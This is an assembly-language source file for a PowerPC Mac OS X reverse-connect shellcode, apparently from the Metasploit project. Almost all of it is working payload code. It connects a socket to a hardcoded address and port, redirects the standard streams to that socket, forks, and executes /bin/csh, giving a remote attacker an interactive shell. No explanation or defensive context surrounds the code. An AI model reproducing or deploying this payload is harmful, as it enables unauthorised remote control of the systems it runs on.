;      Title:  MacOS X Reverse Connect Shell (w/nulls)
;  Platforms:  MacOS X (Tested 10.3.3 | 10.3.4)
;     Author:  hdm[at]metasploit.com


.globl _main
.text
_main:
	;; socket
	li      r3, 2
        li      r4, 1
        li      r5, 6
        li      r0, 97
        sc
        xor     r0, r0, r0
        mr      r30, r3

        bl	_connect
        .long 	0x00022211
        .long 	0x7f000001

_connect:
        mflr    r4
        li      r5, 0x10
        li      r0, 98
        mr      r3, r30
        sc
        xor     r0, r0, r0

_setup_dup2:
        li      r5, 2

_dup2:
        li      r0, 90
        mr      r3, r30
        mr      r4, r5
        sc
        xor     r0, r0, r0
        subi    r5, r5, 1
        cmpwi   r5, -1
        bnel    _dup2

_fork:
        li      r0, 2
        sc
	xor	r0, r0, r0

_execsh:
        xor.    r5, r5, r5
        bnel    _execsh
        mflr    r3
        addi    r3, r3, 28
        stw     r3, -8(r1)      ; argv[0] = path
        stw     r5, -4(r1)      ; argv[1] = NULL
        subi    r4, r1, 8       ; r4 = {path, 0}
        li      r0, 59
        sc                      ; execve(path, argv, NULL)

_path:  .asciz 	"/bin/csh"
	.byte 	0, 0x41, 0x41


